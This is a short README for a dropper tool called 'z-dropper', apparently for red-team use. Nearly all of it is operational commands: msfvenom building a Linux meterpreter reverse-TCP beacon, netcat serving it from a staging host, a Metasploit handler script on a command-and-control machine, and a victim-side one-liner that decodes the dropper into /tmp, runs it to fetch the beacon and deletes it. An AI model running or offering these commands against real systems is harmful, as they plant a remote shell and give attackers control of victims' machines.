# z-dropper

## GEN1

Staging machine (ephemeral):

```
staging$ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<C2_IP> LPORT=443 --platform linux -f elf -a x64 -o beacon-mettle
staging$ nc -nlvp 443 < beacon-mettle
```

Command and control machine:

```
c2$ cat > mettle-handler.rc <<'EOF'
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter_reverse_tcp
set LHOST <C2_IP>  
set LPORT 443 
set ExitOnSession false
exploit -j -z
EOF

c2$ msfconsole -r mettle-handler.rc
```

Attacker machine:

```
redteam$ git clone https://github.com/mzet-/z-dropper; cd z-dropper
redteam$ EXE=z-dropper-gen1; zig cc -static -Os -target x86_64-linux-musl ${EXE}.c -o $EXE; strip -x -R -s -g $EXE; echo; cat "$EXE" | base64 -w 0; echo; echo
```

Victim machine:

```
victim$ echo -n "$BASE64_ENCODED_BIN" | base64 -d >/tmp/s; chmod +x /tmp/s; /tmp/s <STAGING_IP> 443; rm /tmp/s
```
